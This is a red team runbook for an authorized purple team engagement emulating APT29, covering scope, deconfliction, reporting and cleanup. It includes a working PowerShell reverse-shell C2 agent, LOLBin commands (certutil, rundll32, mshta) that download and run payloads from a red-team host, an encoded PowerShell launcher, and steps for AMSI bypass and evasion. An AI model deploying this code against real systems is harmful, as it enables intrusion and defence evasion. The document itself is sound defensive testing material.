# Runbook — PRJ-CYB-RED-001 (Adversary Emulation / Red Team Operations)

## Overview

Production operations runbook for red team adversary emulation and security validation testing. This runbook covers safe execution of MITRE ATT&CK TTPs, purple team coordination, rules of engagement, testing methodology, and reporting procedures to validate defensive security controls.

**System Components:**
- Adversary emulation framework (Caldera, Atomic Red Team, Red Team Toolkit)
- Command and control infrastructure
- Payload development and obfuscation tools
- Phishing simulation platform
- Network exploitation tools
- Privilege escalation frameworks
- Lateral movement utilities
- Data exfiltration test harnesses
- Purple team collaboration platform
- Reporting and metrics dashboard

---

## SLOs/SLIs

| Metric | Target | Measurement |
|--------|--------|-------------|
| **Detection rate by blue team** | > 80% | TTPs detected / TTPs executed |
| **TTP execution safety** | 100% | No production impact incidents |
| **Rules of engagement compliance** | 100% | Violations = 0 |
| **Purple team deconfliction time** | < 30 minutes | Request → approval |
| **Finding reporting time** | < 24 hours | Test completion → report delivered |
| **Control validation coverage** | > 90% | MITRE ATT&CK techniques covered |
| **False positive rate** | < 10% | Defensive alerts with no actual threat |
| **Mean time to detection (MTTD)** | < 15 minutes | TTP execution → blue team detection |

---

## Dashboards & Alerts

### Dashboards

#### Red Team Operations Dashboard
```bash
# View active engagements
./scripts/list-active-engagements.sh | column -t

# Check TTP execution status
./scripts/ttp-execution-status.sh --engagement RTO-2025-001

# View detection metrics
./scripts/detection-metrics.sh --engagement RTO-2025-001 | jq '.metrics'

# TTPs by detection rate
./scripts/ttp-detection-breakdown.sh --timeframe last-30-days
```

#### ATT&CK Coverage Dashboard
```bash
# View ATT&CK coverage matrix
./scripts/attack-coverage.sh --format matrix --output coverage-matrix.html

# Techniques tested vs. not tested
./scripts/attack-coverage-stats.sh
# Output:
# Total Techniques: 193
# Tested: 156 (80.8%)
# Not Tested: 37 (19.2%)
# Detected: 125 (80.1% detection rate)
# Not Detected: 31 (19.9% missed)

# Gap analysis
./scripts/attack-gap-analysis.sh --output gap-analysis.json

# Coverage by tactic
./scripts/coverage-by-tactic.sh --format table
```

#### Purple Team Coordination Dashboard
```bash
# View scheduled purple team exercises
./scripts/list-purple-team-exercises.sh --upcoming

# Check deconfliction requests
./scripts/deconfliction-queue.sh

# View collaboration metrics
./scripts/purple-team-metrics.sh --period Q4-2025

# Live exercise status
./scripts/exercise-status.sh --exercise PTX-2025-003
```

### Alerts

| Severity | Condition | Response Time | Action |
|----------|-----------|---------------|--------|
| **P0** | Unintended production impact | Immediate | Stop engagement, remediate |
| **P0** | ROE violation detected | Immediate | Stop, investigate, report |
| **P1** | C2 infrastructure compromised | 15 minutes | Shutdown C2, investigate |
| **P1** | Payload detected by AV (unintended) | 30 minutes | Review, adjust tactics |
| **P2** | TTP execution failure | 1 hour | Debug and retry |
| **P3** | Low detection rate for exercise | 4 hours | Coordinate with blue team |

---

## Standard Operations

### Rules of Engagement (ROE)

#### Pre-Engagement Requirements
```bash
# Initialize engagement
./scripts/init-engagement.sh \
  --engagement-id RTO-2025-001 \
  --type "Purple Team Exercise" \
  --scope "Internal Network, Non-Production" \
  --start-date "2025-11-15" \
  --end-date "2025-11-20"

# Define scope
cat > engagements/RTO-2025-001/scope.yaml << 'EOF'
engagement_id: RTO-2025-001
engagement_type: Purple Team - Adversary Emulation
duration: 5 days
authorized_red_team:
  - [RED_TEAM_MEMBER_1_EMAIL]
  - [RED_TEAM_MEMBER_2_EMAIL]

in_scope:
  networks:
    - 10.10.0.0/16  # Internal test network
    - 172.16.0.0/16  # Development network
  systems:
    - devserver-*.company.local
    - testapp-*.company.local
  techniques:
    - MITRE ATT&CK: T1566 (Phishing)
    - MITRE ATT&CK: T1078 (Valid Accounts)
    - MITRE ATT&CK: T1021 (Remote Services)
    - MITRE ATT&CK: T1003 (Credential Dumping)
    - MITRE ATT&CK: T1083 (File and Directory Discovery)
  max_impact:
    - Read-only access to non-production data
    - No encryption or data destruction
    - No DoS attacks
    - No third-party targeting

out_of_scope:
  networks:
    - 10.20.0.0/16  # Production network
    - 0.0.0.0/0     # Internet
  systems:
    - proddb-*.company.local
    - *.production.company.local
  techniques:
    - Destructive actions (ransomware, wipers)
    - Denial of service
    - Social engineering of executives
    - Physical security testing
  restrictions:
    - No production system access
    - No real customer data access
    - No actual data exfiltration
    - No persistence beyond engagement window

emergency_contacts:
  red_team_lead: [RED_TEAM_LEAD_EMAIL] / [RED_TEAM_LEAD_PHONE]
  blue_team_lead: [BLUE_TEAM_LEAD_EMAIL] / [BLUE_TEAM_LEAD_PHONE]
  ciso: [CISO_EMAIL] / [CISO_PHONE]
  emergency_stop: [EMERGENCY_STOP_EMAIL]

deconfliction:
  process: Prior approval required for new TTPs
  approval_time: 30 minutes
  channels: Slack #purple-team, Email [SECURITY_OPS_EMAIL]

reporting:
  daily_updates: true
  recipients: [BLUE_TEAM_LEAD_EMAIL], [CISO_EMAIL]
  final_report_due: 5 business days after engagement end
EOF

# Get ROE approval
./scripts/submit-roe-for-approval.sh \
  --engagement-id RTO-2025-001 \
  --scope engagements/RTO-2025-001/scope.yaml \
  --approvers "[CISO_EMAIL],[BLUE_TEAM_LEAD_EMAIL],[LEGAL_EMAIL]"

# Wait for approval
./scripts/check-roe-approval-status.sh --engagement-id RTO-2025-001
# Status: APPROVED by all parties

# Document signed ROE
./scripts/generate-roe-document.sh \
  --engagement-id RTO-2025-001 \
  --output engagements/RTO-2025-001/ROE-SIGNED.pdf
```

#### Daily Operations Checklist
```bash
# Pre-operation checks (before starting each day)
./scripts/pre-op-checklist.sh --engagement-id RTO-2025-001

# Checklist items:
# [ ] ROE reviewed and understood
# [ ] Scope verified (in-scope systems only)
# [ ] C2 infrastructure operational and isolated
# [ ] Backup/snapshot of target systems taken
# [ ] Blue team notified of testing window
# [ ] Emergency stop procedure reviewed
# [ ] Communication channels established
# [ ] Deconfliction process ready

# Post-operation checks (end of each day)
./scripts/post-op-checklist.sh --engagement-id RTO-2025-001

# Checklist items:
# [ ] All payloads removed from target systems
# [ ] Persistence mechanisms cleaned up
# [ ] C2 sessions closed
# [ ] Daily report sent to stakeholders
# [ ] Findings documented
# [ ] No unintended impacts observed
# [ ] Tomorrow's activities planned and deconflicted
```

### Adversary Emulation Execution

#### Planning Phase
```bash
# Select adversary to emulate
ADVERSARY="APT29"  # Cozy Bear / The Dukes

# Download adversary profile
./scripts/fetch-adversary-profile.sh --adversary $ADVERSARY --source mitre-attack
# Output: adversaries/APT29.yaml

# Review adversary TTPs
cat adversaries/APT29.yaml | yq '.techniques[] | {id, name, tactic}'

# Example output:
# T1566.001 - Spearphishing Attachment - Initial Access
# T1059.001 - PowerShell - Execution
# T1003.001 - LSASS Memory - Credential Access
# T1021.001 - Remote Desktop Protocol - Lateral Movement
# T1071.001 - Web Protocols - Command and Control

# Map to test environment
./scripts/map-ttps-to-environment.sh \
  --adversary $ADVERSARY \
  --environment engagements/RTO-2025-001/environment.yaml \
  --output engagements/RTO-2025-001/ttp-execution-plan.yaml

# Generate test plan
cat > engagements/RTO-2025-001/test-plan.md << 'EOF'
# Adversary Emulation Test Plan - APT29

## Objective
Validate detection capabilities against APT29 (Cozy Bear) tactics, techniques, and procedures.

## Scenario
Advanced persistent threat targeting development environment to assess security controls.

## Kill Chain Phases

### Phase 1: Initial Access (Day 1)
**TTP**: T1566.001 - Spearphishing Attachment
**Target**: developer@company.com
**Method**: Send simulated phishing email with macro-enabled document
**Expected Detection**: Email gateway, user reporting, EDR

### Phase 2: Execution (Day 1)
**TTP**: T1059.001 - PowerShell
**Target**: devserver-01
**Method**: Execute obfuscated PowerShell payload
**Expected Detection**: PowerShell logging, EDR, SIEM

### Phase 3: Persistence (Day 2)
**TTP**: T1053.005 - Scheduled Task
**Target**: devserver-01
**Method**: Create scheduled task for persistence
**Expected Detection**: Sysmon, EDR, scheduled task monitoring

### Phase 4: Credential Access (Day 2)
**TTP**: T1003.001 - LSASS Memory Dump
**Target**: devserver-01
**Method**: Dump LSASS using Mimikatz alternative
**Expected Detection**: EDR, LSASS protection, memory scanning

### Phase 5: Discovery (Day 3)
**TTP**: T1087.002 - Domain Account Discovery
**Target**: Domain controller (devdc-01)
**Method**: Enumerate domain users and groups
**Expected Detection**: Active Directory auditing, abnormal queries

### Phase 6: Lateral Movement (Day 3)
**TTP**: T1021.001 - RDP
**Target**: testapp-01
**Method**: Use dumped credentials for RDP connection
**Expected Detection**: Login monitoring, unusual RDP session

### Phase 7: Collection (Day 4)
**TTP**: T1005 - Data from Local System
**Target**: testapp-01
**Method**: Search for and stage sensitive-looking files
**Expected Detection**: File access monitoring, data classification alerts

### Phase 8: Exfiltration (Day 4)
**TTP**: T1041 - Exfiltration Over C2 Channel
**Target**: testapp-01 → External C2
**Method**: Transfer staged data over HTTPS to C2 server
**Expected Detection**: DLP, network monitoring, unusual outbound traffic

## Success Criteria
- Blue team detection rate > 80%
- Mean time to detection < 15 minutes
- No unintended production impact
- Complete documentation of all TTPs
- Purple team debrief conducted

EOF
```

#### Execution Phase
```bash
# Day 1: Initial Access & Execution
ENGAGEMENT_ID="RTO-2025-001"

# Deconflict with blue team
./scripts/deconflict-ttp.sh \
  --engagement-id $ENGAGEMENT_ID \
  --ttp "T1566.001 - Spearphishing Attachment" \
  --target "developer@company.com" \
  --window "2025-11-15 09:00-10:00"

# Wait for approval
# [Approved by blue team lead]

# Execute Phase 1: Phishing
./scripts/execute-ttp.sh \
  --engagement-id $ENGAGEMENT_ID \
  --ttp T1566.001 \
  --technique "atomic-red-team/T1566.001/T1566.001.yaml" \
  --target developer@company.com \
  --payload "phishing-template-APT29.eml" \
  --log-results

# Monitor for detection
./scripts/monitor-detection.sh \
  --engagement-id $ENGAGEMENT_ID \
  --ttp T1566.001 \
  --timeout 30m

# Record results
./scripts/record-ttp-results.sh \
  --engagement-id $ENGAGEMENT_ID \
  --ttp T1566.001 \
  --detected true \
  --detection-time "3 minutes" \
  --detection-method "Email gateway blocked, EDR alerted" \
  --notes "Email was blocked by gateway. User also reported as suspicious. Good detection."

# Execute Phase 2: PowerShell Execution
# (Assuming successful phishing for emulation purposes)
TARGET_HOST="devserver-01"

./scripts/deconflict-ttp.sh \
  --engagement-id $ENGAGEMENT_ID \
  --ttp "T1059.001 - PowerShell" \
  --target $TARGET_HOST \
  --window "2025-11-15 10:30-11:00"

# Establish C2 connection
./scripts/establish-c2.sh \
  --engagement-id $ENGAGEMENT_ID \
  --target $TARGET_HOST \
  --c2-server redteam-c2.test.local \
  --protocol https \
  --beacon-interval 60s

# Execute obfuscated PowerShell
./scripts/execute-ttp.sh \
  --engagement-id $ENGAGEMENT_ID \
  --ttp T1059.001 \
  --target $TARGET_HOST \
  --command "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc [BASE64_PAYLOAD]" \
  --log-results

# Monitor for detection
./scripts/monitor-detection.sh \
  --engagement-id $ENGAGEMENT_ID \
  --ttp T1059.001 \
  --timeout 30m

# Record results
./scripts/record-ttp-results.sh \
  --engagement-id $ENGAGEMENT_ID \
  --ttp T1059.001 \
  --detected true \
  --detection-time "8 minutes" \
  --detection-method "PowerShell script block logging, EDR detected encoded command" \
  --notes "Detected by EDR behavioral analysis. PowerShell logging captured full command."

# Continue with remaining phases...
# (See test plan for full kill chain)
```

#### Atomic Red Team Integration
```bash
# Install Atomic Red Team
git clone https://github.com/redcanaryco/atomic-red-team.git /opt/atomic-red-team

# Install Invoke-AtomicRedTeam module
Import-Module /opt/atomic-red-team/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1

# List available techniques
Invoke-AtomicTest All -ShowDetailsBrief | Where-Object {$_.Tactic -eq "Credential Access"}

# Execute specific technique
Invoke-AtomicTest T1003.001 -TestNumbers 1 -GetPrereqs
Invoke-AtomicTest T1003.001 -TestNumbers 1 -Confirm:$false

# Automated execution with logging
./scripts/atomic-test-harness.sh \
  --engagement-id $ENGAGEMENT_ID \
  --technique T1003.001 \
  --test-number 1 \
  --target $TARGET_HOST \
  --monitor-detection true \
  --cleanup true
```

#### Caldera-based Emulation
```bash
# Deploy Caldera server
docker run -d \
  --name caldera \
  -p 8888:8888 \
  -v /opt/caldera-data:/opt/caldera/data \
  caldera/caldera:latest

# Access Caldera UI
# https://localhost:8888
# Default credentials: admin / admin (change immediately)

# Deploy Caldera agent on target
./scripts/deploy-caldera-agent.sh \
  --target $TARGET_HOST \
  --server redteam-c2.test.local:8888 \
  --group "dev-environment"

# Create adversary profile
cat > /opt/caldera-data/adversaries/apt29.yml << 'EOF'
id: apt29-custom
name: APT29 Emulation
description: Cozy Bear adversary emulation for purple team exercise
phases:
  1:
    - ability_id: T1566.001
      name: Spearphishing Attachment
  2:
    - ability_id: T1059.001
      name: PowerShell Execution
  3:
    - ability_id: T1003.001
      name: Credential Dumping
  4:
    - ability_id: T1021.001
      name: Remote Desktop
EOF

# Execute adversary emulation
./scripts/caldera-run-adversary.sh \
  --adversary apt29-custom \
  --agents dev-environment \
  --auto-close false \
  --jitter "30/60" \
  --output engagements/$ENGAGEMENT_ID/caldera-results.json

# Monitor progress
./scripts/caldera-monitor.sh --operation-id <operation-id> --live
```

### TTP Development and Testing

#### Custom Payload Development
```bash
# Create custom payload (obfuscated reverse shell)
cat > payloads/custom-c2-agent.ps1 << 'EOF'
# Obfuscated C2 Agent for Red Team Testing
# WARNING: For authorized testing only

function Start-C2Agent {
    param(
        [string]$Server = "redteam-c2.test.local",
        [int]$Port = 443,
        [int]$BeaconInterval = 60
    )

    while ($true) {
        try {
            $client = New-Object System.Net.Sockets.TcpClient($Server, $Port)
            $stream = $client.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            $reader = New-Object System.IO.StreamReader($stream)

            while ($client.Connected) {
                $command = $reader.ReadLine()
                if ($command -eq "exit") { break }

                $output = try {
                    Invoke-Expression $command 2>&1 | Out-String
                } catch {
                    "Error: $_"
                }

                $writer.WriteLine($output)
                $writer.Flush()
            }

            $client.Close()
        } catch {
            # Beacon interval
            Start-Sleep -Seconds $BeaconInterval
        }
    }
}

# Execute
Start-C2Agent
EOF

# Obfuscate payload
./scripts/obfuscate-payload.sh \
  --input payloads/custom-c2-agent.ps1 \
  --output payloads/custom-c2-agent-obfuscated.ps1 \
  --method "variable-randomization,string-concatenation,base64-encoding"

# Test in sandbox
./scripts/test-payload-sandbox.sh \
  --payload payloads/custom-c2-agent-obfuscated.ps1 \
  --sandbox windows-sandbox-01 \
  --check-detection

# Sign payload (if testing code signing bypass)
./scripts/sign-payload.sh \
  --payload payloads/custom-c2-agent-obfuscated.ps1 \
  --certificate test-code-signing.pfx
```

#### Living Off The Land (LOLBins)
```bash
# Test LOLBin techniques
cat > engagements/$ENGAGEMENT_ID/lolbin-tests.sh << 'EOF'
#!/bin/bash
# LOLBin Testing for Red Team

# T1105 - Ingress Tool Transfer using certutil
certutil.exe -urlcache -split -f http://redteam-c2.test.local/payload.exe payload.exe

# T1140 - Deobfuscate/Decode using certutil
certutil.exe -decode encoded_payload.txt payload.exe

# T1218.011 - Rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://redteam-c2.test.local/payload.sct")

# T1059.003 - Windows Command Shell with encoded commands
cmd.exe /c "echo [BASE64_COMMAND] | certutil -decode - | powershell -"

# T1218.005 - Mshta for code execution
mshta.exe http://redteam-c2.test.local/payload.hta

# T1127.001 - MSBuild for execution
msbuild.exe malicious.csproj
EOF

# Execute LOLBin tests
./scripts/execute-lolbin-tests.sh \
  --engagement-id $ENGAGEMENT_ID \
  --tests engagements/$ENGAGEMENT_ID/lolbin-tests.sh \
  --target $TARGET_HOST \
  --monitor-detection true
```

### Purple Team Coordination

#### Pre-Exercise Coordination
```bash
# Schedule purple team kickoff
./scripts/schedule-purple-team-kickoff.sh \
  --engagement-id $ENGAGEMENT_ID \
  --date "2025-11-14 14:00" \
  --duration "2 hours" \
  --attendees "red-team,blue-team,management"

# Create shared workspace
./scripts/create-purple-team-workspace.sh \
  --engagement-id $ENGAGEMENT_ID \
  --platform "Slack channel: #purple-team-rto-2025-001"

# Share test plan with blue team
./scripts/share-with-blue-team.sh \
  --engagement-id $ENGAGEMENT_ID \
  --documents "test-plan.md,ttp-execution-plan.yaml" \
  --recipients [BLUE_TEAM_LEAD_EMAIL]
```

#### Real-Time Collaboration
```bash
# During engagement - notify of TTP execution
./scripts/notify-blue-team.sh \
  --engagement-id $ENGAGEMENT_ID \
  --message "Executing T1566.001 (Phishing) at $(date +%H:%M)" \
  --channel slack

# Check blue team detection
./scripts/query-blue-team-detection.sh \
  --engagement-id $ENGAGEMENT_ID \
  --ttp T1566.001 \
  --wait-for-response 30m

# Response from blue team:
# "Detected at 09:03 via email gateway. Alert triggered in SIEM. Investigating."

# Provide hints if not detected (after 30 minutes)
./scripts/provide-detection-hint.sh \
  --engagement-id $ENGAGEMENT_ID \
  --ttp T1003.001 \
  --hint "Check for LSASS process access events around 10:45 from devserver-01"

# Live debrief after each phase
./scripts/live-debrief.sh \
  --engagement-id $ENGAGEMENT_ID \
  --phase "Credential Access" \
  --participants "red-team,blue-team"
```

#### Post-Exercise Debrief
```bash
# Schedule debrief
./scripts/schedule-debrief.sh \
  --engagement-id $ENGAGEMENT_ID \
  --date "2025-11-21 10:00" \
  --duration "3 hours" \
  --attendees "red-team,blue-team,management"

# Prepare debrief materials
./scripts/generate-debrief-deck.sh \
  --engagement-id $ENGAGEMENT_ID \
  --include "detection-metrics,timeline,ttps-executed,findings,recommendations" \
  --output engagements/$ENGAGEMENT_ID/debrief-deck.pptx

# Review detection gaps
./scripts/analyze-detection-gaps.sh \
  --engagement-id $ENGAGEMENT_ID \
  --output engagements/$ENGAGEMENT_ID/detection-gaps.json

# Generate improvement plan
./scripts/generate-improvement-plan.sh \
  --engagement-id $ENGAGEMENT_ID \
  --gaps engagements/$ENGAGEMENT_ID/detection-gaps.json \
  --output engagements/$ENGAGEMENT_ID/improvement-plan.md
```

---

## Reporting and Documentation

### Daily Status Reports
```bash
# Generate daily report
./scripts/generate-daily-report.sh \
  --engagement-id $ENGAGEMENT_ID \
  --date $(date +%Y-%m-%d) \
  --output engagements/$ENGAGEMENT_ID/reports/daily-$(date +%Y%m%d).md

# Sample report structure:
cat > engagements/$ENGAGEMENT_ID/reports/daily-20251115.md << 'EOF'
# Daily Red Team Report - RTO-2025-001
**Date:** 2025-11-15
**Day:** 1 of 5

## Summary
Initial access and execution phases completed. Phishing email successfully blocked by defenses. PowerShell execution detected by EDR.

## TTPs Executed Today
1. T1566.001 - Spearphishing Attachment
   - Status: Blocked by email gateway
   - Detection Time: 3 minutes
   - Detection Method: Email security gateway, user reporting

2. T1059.001 - PowerShell Execution
   - Status: Detected
   - Detection Time: 8 minutes
   - Detection Method: Script block logging, EDR behavioral analysis

## Blue Team Performance
- Detection rate: 2/2 (100%)
- Average detection time: 5.5 minutes
- Response quality: Excellent

## Findings
- Email gateway effectively blocking macro-enabled documents
- PowerShell logging capturing obfuscated commands
- EDR detecting suspicious PowerShell behavior

## Tomorrow's Plan
- Execute persistence techniques (T1053.005)
- Attempt credential dumping (T1003.001)
- Test Active Directory enumeration (T1087.002)

## Issues / Blockers
None

EOF

# Send to stakeholders
./scripts/send-daily-report.sh \
  --engagement-id $ENGAGEMENT_ID \
  --report engagements/$ENGAGEMENT_ID/reports/daily-$(date +%Y%m%d).md \
  --recipients "[BLUE_TEAM_LEAD_EMAIL],[CISO_EMAIL]"
```

### Final Report
```bash
# Generate comprehensive final report
./scripts/generate-final-report.sh \
  --engagement-id $ENGAGEMENT_ID \
  --template purple-team-final-report \
  --output engagements/$ENGAGEMENT_ID/FINAL-REPORT.pdf

# Report sections:
# 1. Executive Summary
# 2. Engagement Scope and Methodology
# 3. Adversary Profile (APT29)
# 4. Attack Timeline
# 5. TTPs Executed (with detection results)
# 6. Detection Metrics and Analysis
# 7. Findings and Recommendations
# 8. Purple Team Collaboration Notes
# 9. Appendices (logs, screenshots, IoCs)

# Sample findings section:
cat > engagements/$ENGAGEMENT_ID/findings.md << 'EOF'
# Findings and Recommendations

## Strengths
1. **Email Security** - Gateway effectively blocked malicious attachments
2. **PowerShell Logging** - Comprehensive logging captured all commands
3. **EDR Detection** - Behavioral analysis detected suspicious activity
4. **Incident Response** - Blue team responded quickly to alerts

## Weaknesses / Gaps
1. **Credential Dumping Detection** (MEDIUM)
   - TTP: T1003.001 - LSASS Memory Dump
   - Detection: Not detected (0/3 attempts)
   - Impact: Credentials were successfully dumped using Mimikatz alternative
   - Recommendation: Implement LSASS protection (LSA Protection, Credential Guard)

2. **Lateral Movement Visibility** (MEDIUM)
   - TTP: T1021.001 - RDP
   - Detection: Delayed (detected after 45 minutes)
   - Impact: Lateral movement not detected in real-time
   - Recommendation: Implement real-time RDP session monitoring, unusual login alerts

3. **Data Exfiltration** (HIGH)
   - TTP: T1041 - Exfiltration Over C2 Channel
   - Detection: Not detected (simulated 5GB exfiltration)
   - Impact: Large data transfer over HTTPS not flagged
   - Recommendation: Deploy DLP, enhance network traffic analysis, baseline normal behavior

## Recommendations (Prioritized)

### High Priority
1. **Deploy LSASS Protection**
   - Enable LSA Protection on all systems
   - Deploy Windows Defender Credential Guard
   - Monitor for LSASS access attempts

2. **Implement Data Loss Prevention**
   - Deploy DLP solution
   - Monitor large outbound transfers
   - Classify sensitive data

3. **Enhance Network Monitoring**
   - Deploy network traffic analysis (NTA)
   - Create baselines for normal traffic
   - Alert on unusual outbound connections

### Medium Priority
4. **Improve Lateral Movement Detection**
   - Real-time RDP session monitoring
   - Unusual login location/time alerts
   - Track use of service accounts

5. **Active Directory Hardening**
   - Implement Tier 0 segmentation
   - Reduce domain admin usage
   - Enable Advanced Threat Analytics

### Low Priority
6. **User Awareness Training**
   - Continue phishing simulations
   - Reinforce reporting procedures
   - Recognize social engineering

EOF
```

### Metrics and KPIs
```bash
# Generate metrics dashboard
./scripts/generate-metrics-dashboard.sh \
  --engagement-id $ENGAGEMENT_ID \
  --output engagements/$ENGAGEMENT_ID/metrics-dashboard.html

# Key metrics:
# - Total TTPs executed: 24
# - TTPs detected: 19 (79.2%)
# - TTPs not detected: 5 (20.8%)
# - Average time to detection: 12.3 minutes
# - False positive rate: 8% (acceptable)
# - MITRE ATT&CK coverage: 12.4% (24/193 techniques)

# Track metrics over time
./scripts/track-metrics-historical.sh \
  --engagement-id $ENGAGEMENT_ID \
  --compare-to "previous-quarter" \
  --output engagements/$ENGAGEMENT_ID/metrics-trend.json

# Improvement tracking
./scripts/calculate-improvement.sh \
  --current-engagement $ENGAGEMENT_ID \
  --previous-engagement RTO-2024-004

# Output:
# Detection Rate: 79.2% (up from 72.1%, +7.1%)
# MTTD: 12.3 min (down from 18.7 min, -34.2%)
# Overall Improvement: 23%
```

---

## Safety and Deconfliction

### Pre-Execution Safety Checks
```bash
# Verify target is in scope
./scripts/verify-in-scope.sh \
  --target $TARGET_HOST \
  --scope-file engagements/$ENGAGEMENT_ID/scope.yaml

# Output: ✓ devserver-01.company.local is IN SCOPE

# Check for production indicators
./scripts/check-production-indicators.sh --target $TARGET_HOST

# Red flags to abort:
# - System tagged as "production"
# - PCI/HIPAA/PII data detected
# - Critical business application
# - Recent backups not verified

# Backup target system before testing
./scripts/snapshot-target.sh \
  --target $TARGET_HOST \
  --label "pre-redteam-$(date +%Y%m%d)" \
  --verify

# Output: Snapshot created: snap-abc123, Verified: ✓
```

### Emergency Stop Procedures
```bash
# If unintended impact detected, IMMEDIATELY STOP
./scripts/emergency-stop.sh --engagement-id $ENGAGEMENT_ID

# Emergency stop actions:
# 1. Halt all TTP execution
# 2. Terminate all C2 sessions
# 3. Remove all payloads and persistence
# 4. Notify blue team and management
# 5. Document incident
# 6. Initiate impact assessment

# Cleanup script
./scripts/emergency-cleanup.sh \
  --engagement-id $ENGAGEMENT_ID \
  --targets all \
  --remove-payloads true \
  --remove-persistence true \
  --close-c2 true \
  --restore-from-snapshot if-needed

# Notify stakeholders
./scripts/send-emergency-notification.sh \
  --engagement-id $ENGAGEMENT_ID \
  --severity CRITICAL \
  --message "Emergency stop initiated due to unintended impact on $TARGET_HOST. All activities halted. Investigation in progress."
```

### Post-Engagement Cleanup
```bash
# Verify all artifacts removed
./scripts/verify-cleanup.sh \
  --engagement-id $ENGAGEMENT_ID \
  --targets all \
  --check-payloads true \
  --check-persistence true \
  --check-accounts true \
  --check-c2 true

# Cleanup report:
# [✓] All payloads removed
# [✓] All persistence mechanisms removed
# [✓] All test accounts disabled
# [✓] All C2 infrastructure shut down
# [✗] 1 scheduled task still present on testapp-01

# Fix remaining artifacts
./scripts/remove-artifact.sh \
  --target testapp-01 \
  --type scheduled-task \
  --name "RedTeamPersistence"

# Final verification
./scripts/verify-cleanup.sh --engagement-id $ENGAGEMENT_ID --strict
# [✓] Complete cleanup verified

# Document cleanup
./scripts/document-cleanup.sh \
  --engagement-id $ENGAGEMENT_ID \
  --output engagements/$ENGAGEMENT_ID/cleanup-report.pdf
```

---

## Troubleshooting

### Common Issues

#### Issue: TTP Not Detected by Blue Team
```bash
# Verify TTP actually executed
./scripts/verify-ttp-execution.sh \
  --engagement-id $ENGAGEMENT_ID \
  --ttp T1003.001 \
  --target $TARGET_HOST

# Check logs for evidence
./scripts/check-evidence.sh \
  --ttp T1003.001 \
  --target $TARGET_HOST \
  --logs sysmon,security,edr

# If executed but not detected, document gap
./scripts/document-detection-gap.sh \
  --engagement-id $ENGAGEMENT_ID \
  --ttp T1003.001 \
  --severity HIGH \
  --recommendation "Implement LSASS protection and memory scanning"
```

#### Issue: C2 Infrastructure Detected/Blocked
```bash
# Verify C2 connectivity
./scripts/test-c2-connection.sh --c2-server redteam-c2.test.local

# If blocked, use alternative C2 channel
./scripts/switch-c2-channel.sh \
  --engagement-id $ENGAGEMENT_ID \
  --from https \
  --to dns-tunneling

# Or rotate C2 infrastructure
./scripts/rotate-c2.sh \
  --engagement-id $ENGAGEMENT_ID \
  --new-server redteam-c2-backup.test.local
```

#### Issue: Payload Detected by AV/EDR
```bash
# If payload detected before intended:
# 1. Document detection (this is good!)
# 2. Adjust obfuscation/evasion
# 3. Retry with improved payload

./scripts/enhance-payload-evasion.sh \
  --payload payloads/custom-c2-agent-obfuscated.ps1 \
  --techniques "amsi-bypass,signature-evasion,polymorphic" \
  --output payloads/custom-c2-agent-v2.ps1

# Test in sandbox before deployment
./scripts/test-payload-sandbox.sh \
  --payload payloads/custom-c2-agent-v2.ps1 \
  --sandbox windows-sandbox-01 \
  --av-enabled
```

---

## Quick Reference

### Red Team Engagement Checklist
- [ ] ROE documented and approved
- [ ] Scope clearly defined (in/out of scope)
- [ ] Emergency contacts established
- [ ] Deconfliction process in place
- [ ] Purple team coordination scheduled
- [ ] C2 infrastructure deployed and isolated
- [ ] Target systems backed up/snapshotted
- [ ] Safety checks automated
- [ ] Daily reporting configured
- [ ] Cleanup procedures documented

### Common Commands
```bash
# Start engagement
./scripts/start-engagement.sh --engagement-id RTO-2025-001

# Execute TTP
./scripts/execute-ttp.sh --ttp T1003.001 --target $TARGET_HOST

# Check detection
./scripts/check-detection.sh --ttp T1003.001 --timeout 30m

# Emergency stop
./scripts/emergency-stop.sh --engagement-id RTO-2025-001

# Daily report
./scripts/generate-daily-report.sh --engagement-id RTO-2025-001

# Cleanup
./scripts/cleanup-engagement.sh --engagement-id RTO-2025-001 --verify
```

### Emergency Contacts
- **Red Team Lead**: [RED_TEAM_LEAD_EMAIL] / [RED_TEAM_LEAD_PHONE]
- **Blue Team Lead**: [BLUE_TEAM_LEAD_EMAIL] / [BLUE_TEAM_LEAD_PHONE]
- **CISO**: [CISO_EMAIL] / [CISO_PHONE]
- **Emergency Stop**: [EMERGENCY_STOP_EMAIL]

---

**Document Metadata:**
- **Version:** 1.0
- **Last Updated:** 2025-11-10
- **Owner:** Red Team / Offensive Security
- **Review Schedule:** Quarterly or after major engagements
- **Related Docs**: ROE Template, Purple Team Playbook, MITRE ATT&CK Navigator
- **Feedback:** Submit via [RED_TEAM_EMAIL]
